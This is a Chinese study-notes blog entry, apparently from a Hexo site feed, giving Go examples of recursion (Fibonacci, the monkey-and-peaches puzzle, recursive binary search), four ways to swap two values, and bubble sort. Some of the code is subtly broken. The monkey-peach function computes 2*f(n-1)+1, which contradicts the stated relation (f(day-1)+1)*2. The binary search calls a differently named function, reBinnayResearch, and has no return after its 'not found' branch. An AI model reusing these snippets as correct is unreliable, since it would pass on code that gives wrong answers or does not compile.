    <content><![CDATA[<h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><h2 id="求第n个斐波那契数"><a href="#求第n个斐波那契数" class="headerlink" title="求第n个斐波那契数"></a>求第n个斐波那契数</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibo</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">1</span> || n == <span class="number">2</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fibo(n<span class="number">-1</span>) + fibo(n<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="猴子吃桃"><a href="#猴子吃桃" class="headerlink" title="猴子吃桃"></a>猴子吃桃</h2><p>猴子从第一天开始，每天吃掉一半后再吃掉一个，第10天剩下1个</p>
<blockquote>
<p>思路：可以把第10天当第1天，这样就好想了<br>即 递归结束条件为 n == 1 (第10天)<br>两天的之间的关系式为：(f(day-1)+1) * 2<br>当然 你也可以把按照常理来思考，只是递归结束条件和两天之间的关系式有所不同</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>*f(n<span class="number">-1</span>) + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用f(10)</span></span><br></pre></td></tr></table></figure>

<h2 id="二分查找的递归形式"><a href="#二分查找的递归形式" class="headerlink" title="二分查找的递归形式"></a>二分查找的递归形式</h2><blockquote>
<p>思路：（数组为升序排列）mid = (left + right) / 2，之后判断，有4种结果。结果1：找到了，直接结束递归； 结果2：findVal &lt; list[mid] –&gt; right = mid - 1； 结果3：findVal &gt; list[mid] –&gt; left = mid + 1；结果4：left &gt; right，不满足条件结束递归<br>结束递归条件：left &gt; right<br>进行递归，将上述剩余结果写成 if else即可<br>参数传递为  切片，left， right即下标， findVal需要查找的数</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">binnayResearch</span><span class="params">(list []<span class="keyword">int</span>, left <span class="keyword">int</span>, right <span class="keyword">int</span>, findVal <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> left &gt; right &#123;</span><br><span class="line">		fmt.Println(<span class="string">"找不到"</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mid := (left+right) / <span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> list[mid] &gt; findVal &#123;</span><br><span class="line">		reBinnayResearch(list, left, mid - <span class="number">1</span>, findVal)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> list[mid] &lt; findVal &#123;</span><br><span class="line">		reBinnayResearch(list, mid + <span class="number">1</span>, right, findVal)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"找到，下标为"</span>, mid)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="交换两数a-b的值"><a href="#交换两数a-b的值" class="headerlink" title="交换两数a, b的值"></a>交换两数a, b的值</h1><h2 id="使用中间值t"><a href="#使用中间值t" class="headerlink" title="使用中间值t"></a>使用中间值t</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line">t = a</span><br><span class="line">a = b</span><br><span class="line">b = t</span><br></pre></td></tr></table></figure>
<h2 id="实现"><a href="#实现" class="headerlink" title="+- 实现"></a>+- 实现</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2 </span></span><br><span class="line">a = a + b</span><br><span class="line">b = a - b</span><br><span class="line">a = a - b</span><br></pre></td></tr></table></figure>

<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a = a ^ b</span><br><span class="line">b = a ^ b</span><br><span class="line">a = a ^ b</span><br></pre></td></tr></table></figure>

<h2 id="go语言特有的"><a href="#go语言特有的" class="headerlink" title="go语言特有的"></a>go语言特有的</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a, b = b, a</span><br><span class="line"><span class="comment">// 我的理解这种应该是对使用中间值t的缩略写法</span></span><br></pre></td></tr></table></figure>

<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><h2 id="交换式排序"><a href="#交换式排序" class="headerlink" title="交换式排序"></a>交换式排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// []int 切片为引用类型所以可以直接修改原值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bobbleSort</span><span class="params">(list []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(list)</span><br><span class="line">	<span class="keyword">for</span> i := length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i-- &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; i; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> list[j] &gt; list[j+<span class="number">1</span>] &#123;</span><br><span class="line">				list[j], list[j+<span class="number">1</span>] = list[j+<span class="number">1</span>], list[j] <span class="comment">// swap</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>常见算法真题</category>
        <category>golang学习</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
</search>
